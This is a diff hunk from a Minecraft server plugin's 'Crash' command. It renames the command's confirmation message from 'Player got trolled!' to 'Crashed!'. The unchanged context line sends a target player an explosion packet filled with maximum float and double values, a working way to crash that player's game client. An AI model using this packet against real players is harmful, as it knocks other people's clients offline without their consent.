@@ -23,7 +23,7 @@ public class Crash extends FoxCommand {
                 return true;
             }
             PacketEvents.get().getPlayerUtils().sendPacket(p.getPlayer(), new WrappedPacketOutExplosion(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, new ArrayList<>(), Float.MAX_VALUE, Float.MAX_VALUE, Float.MAX_VALUE));
-            sender.sendMessage(ColorUtil.translate("&cPlayer got trolled!"));
+            sender.sendMessage(ColorUtil.translate("&cCrashed!"));
             return true;
         }
         return false;
